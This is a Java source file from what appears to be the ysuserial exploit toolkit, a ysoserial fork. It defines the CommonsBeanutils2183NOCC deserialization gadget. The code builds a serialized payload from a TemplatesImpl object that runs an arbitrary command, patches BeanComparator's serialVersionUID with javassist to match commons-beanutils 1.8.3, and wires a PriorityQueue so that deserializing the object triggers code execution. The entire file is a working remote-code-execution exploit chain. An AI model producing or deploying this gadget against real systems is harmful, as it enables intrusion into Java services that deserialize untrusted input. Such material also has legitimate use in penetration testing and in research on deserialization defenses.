package org.su18.ysuserial.payloads.gadgets;

import javassist.ClassClassPath;
import javassist.CtClass;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.SuClassLoader;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import static org.su18.ysuserial.payloads.config.Config.POOL;
import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.insertField;
import static org.su18.ysuserial.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils2183NOCC implements ObjectPayload<Object> {
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils2183NOCC.class, args);
	}

	@Override
	public Object getObject(String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// 修改BeanComparator类的serialVersionUID
		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");

		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		setFieldValue(comparator, "property", "lowestSetBit");
		PriorityQueue<Object> queue = new PriorityQueue(2, comparator);
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));
		setFieldValue(comparator, "property", "outputProperties");
		Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;
		return queue;
	}
}
